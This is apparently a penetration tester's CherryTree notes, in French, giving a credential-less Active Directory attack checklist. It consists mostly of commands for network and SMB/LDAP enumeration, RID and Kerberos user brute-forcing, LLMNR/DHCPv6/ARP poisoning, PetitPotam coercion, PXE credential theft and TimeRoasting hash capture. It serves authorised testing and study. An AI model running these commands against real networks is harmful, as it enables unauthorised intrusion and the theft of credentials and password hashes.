<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>01- no creds</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>01- no creds</h1><br/><p><h2>Phase 1 — Recon &amp; pré-exploitation sans identifiants</h2><ol><li>1. <strong>1. Scan réseau → repérer les hôtes exposés</strong></p><p></li></ol><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># 00 - network scan </span><br />nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>ip_range<span style="color:#ff9d00;font-weight:700">&gt;</span> --generate-hosts-file hosts hosts.txt<br /><br />nmap -sP -p <span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span> puis :<br />nmap -Pn -sV --top-ports 50 --open <span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br />nmap -Pn --script smb-vuln* -p 139,445 <span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br />nmap -Pn -sC -sV -oA <span style="color:#ff9d00;font-weight:700">&lt;</span>output<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br /><span style="color:#0088ff;font-weight:400"># 01- SMB </span><br /><span style="color:#0088ff;font-weight:400">##the guest auth is not enough to list users so we can do RID brute </span><br /><br />nxc smb dc1.delegate.vl -u guest -p <span style="color:#3ad900;font-weight:400">&#39;&#39;</span> --rid-brute <br /><br /></pre></div><ol><li>2. <h2>2. Trouver l’IP du DC</h2></p><p></li></ol><div class="codebox"><pre>nmcli dev show <span style="color:#ff9d00;font-weight:700">|</span> interface <span style="color:#333333;font-weight:400">(IP passerelle/réseau)</span><br />nslookup -type=SRV _ldap._tcp.dc._msdcs.<span style="color:#ff9d00;font-weight:700">&lt;</span>domaine<span style="color:#ff9d00;font-weight:700">&gt;</span><br />nmap -p 88 --open <span style="color:#ff9d00;font-weight:700">&lt;</span>ip_range<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#0088ff;font-weight:400">#  DNS zone transfer</span><br />dig axfr <span style="color:#ff9d00;font-weight:700">&lt;</span>domaine<span style="color:#ff9d00;font-weight:700">&gt;</span> @<span style="color:#ff9d00;font-weight:700">&lt;</span>name_server<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">(si transfert DNS autorisé).</span></pre></div></p><p></p><p><ol><li>3. <h2>3. Accès anonymes/Guest sur partages SMB</h2></p><p></li></ol><div class="codebox"><pre>nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>ip_range<span style="color:#ff9d00;font-weight:700">&gt;</span> -u <span style="color:#3ad900;font-weight:400">&quot;&quot;</span> -p <span style="color:#3ad900;font-weight:400">&quot;&quot;</span><br /><br />enum4linux-ng -a -u <span style="color:#3ad900;font-weight:400">&quot;&quot;</span> -p <span style="color:#3ad900;font-weight:400">&quot;&quot;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br />smbclient -L //<span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#0088ff;font-weight:400"># check for NETLOGON AND SYSVOL as they can contain shares or other policies</span><br /><span style="color:#0088ff;font-weight:400">## e.g looh for bat files </span><br />smbclient -N //<span style="color:#7f0044;font-weight:400">$target</span>/SYSVOL<br /></pre></div></p><p>Gains possibles : partages ouverts, listes d’utilisateurs.</p><p></p><p><ol><li>4. <h2>4. Enumération LDAP</h2></p><p></li></ol><div class="codebox"><pre>nmap -n -sV --script ldap* --not brute -p 389 <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br />ldapsearch -x -H ldap://<span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -s base <br /><br /><span style="color:#0088ff;font-weight:400">#(infos domaine).</span></pre></div></p><p><ol><li>5. <h2>5. Enumération des utilisateurs</h2></p><p></li></ol><div class="codebox"><pre>nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> --users<br /><br />nxc smb <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> --rid-brute 10000 <span style="color:#333333;font-weight:400">(bruteforce RID)</span><br /><br />net rpc group members <span style="color:#3ad900;font-weight:400">&quot;Domain Users&quot;</span> -W <span style="color:#ff9d00;font-weight:700">&lt;</span>domaine<span style="color:#ff9d00;font-weight:700">&gt;</span> -I <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -U <span style="color:#3ad900;font-weight:400">&#39;%&#39;</span></pre></div></p><p><ol><li>6. <h2>6. Bruteforce de noms d’utilisateur</h2></p><p></li></ol><div class="codebox"><pre>kerbrute userenum -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domaine<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>userlist<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br />nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=<span style="color:#ff9d00;font-weight:700">&lt;</span>domaine<span style="color:#ff9d00;font-weight:700">&gt;</span>,userdb=<span style="color:#ff9d00;font-weight:700">&lt;</span>user_list_file<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p>Résultat : nouveaux <em>Username</em>.</p><p></p><p><ol><li>7. <h2>7. Poisoning (LLMNR / NBNS / mDNS / DHCPv6 / ARP)</h2></p><p></li></ol><div class="codebox"><pre>responder -I <span style="color:#ff9d00;font-weight:700">&lt;</span>interface<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br />mitm6 -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domaine<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">(DHCPv6)</span><br /><br />bettercap ou arpspoof pour ARP<br /></pre></div></p><p></p><p>Hashes récupérés : <strong>SMB</strong>, <strong>LDAP</strong>, <strong>HTTP</strong>.</p><p></p><p><ol><li>8. <h2>8. Coercion (PetitPotam non authentifié – CVE-2022-26925)</h2></p><p></li></ol><div class="codebox"><pre>petitpotam.py -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domaine<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>listener<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>target<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p></p><p>Force un DC/serveur à s’authentifier vers nous → <strong>Coerce SMB</strong>.</p><p></p><p><ol><li>9. <h2>9. PXE abuse</h2></li></ol></p><p>Sans mot de passe : <code>pxetheft.py 1</code></p><p></p><p>Mot de passe :<ol><li><code>pxetheft.py 2 &lt;distribution_point_ip&gt;</code> → récup. compte NAA (<em>Credentials (NAA account)</em>)</li></ol></p><p><ol><li><code>ftp &lt;dp_ip&gt; GET \sms\boot\x64\boot.wim</code> → <em>PXE Hash</em>.</li></ol></p><p></p><p></p><p><ol><li>10. <h2>10. TimeRoasting</h2></li></ol></p><p><code>timeroast.py &lt;dc_ip&gt; -o &lt;output_log&gt;</code> </p><p></p><p><em>Timeroast hash</em> (KRBTGT/service accounts).</p><p></p><p></p><p><h2>Livrables de la phase 1</h2><ul><li>Inventaire des hôtes + services ouverts.</li></ul></p><p><ul><li>IP(s) des contrôleurs de domaine.</li></ul></p><p><ul><li>Listes d’utilisateurs AD vérifiés.</li></ul></p><p><ul><li>Partages SMB anonymes.</li></ul></p><p><ul><li>Hashes capturés : SMB / LDAP / HTTP, Coerce SMB, PXE, Timeroast.</li></ul></p><p><ul><li>Potentielles vulnérabilités « low-hanging » (SMB signing off, transferts DNS ouverts, etc.).</li></ul></p><p></p><p></p></div>
</body>
</html>
